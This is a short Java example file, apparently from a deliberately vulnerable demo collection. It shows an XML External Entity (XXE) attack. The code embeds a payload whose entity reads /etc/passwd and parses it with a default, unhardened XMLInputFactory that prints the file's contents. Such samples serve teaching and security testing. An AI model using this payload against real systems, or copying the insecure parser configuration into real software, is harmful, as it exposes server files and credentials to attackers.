package com.govuln.xxe;

import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;
import java.io.*;

public class XMLStreamExample {
    public static void main(String[] args) throws Exception {
        String data = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>\n" +
                "<foo>&xxe;</foo>";
        InputStream input = new ByteArrayInputStream(data.getBytes());
        XMLInputFactory factory = XMLInputFactory.newFactory();
        XMLStreamReader reader = factory.createXMLStreamReader(input);

        while (reader.hasNext()) {
            reader.next();
            if (reader.isStartElement()) {
                System.out.println("Start: " + reader.getLocalName());
            } else if (reader.isEndElement()) {
                System.out.println("End: " + reader.getLocalName());
            } else if (reader.hasText()) {
                System.out.println("Data: " + reader.getText().trim());
            }
        }
    }
}
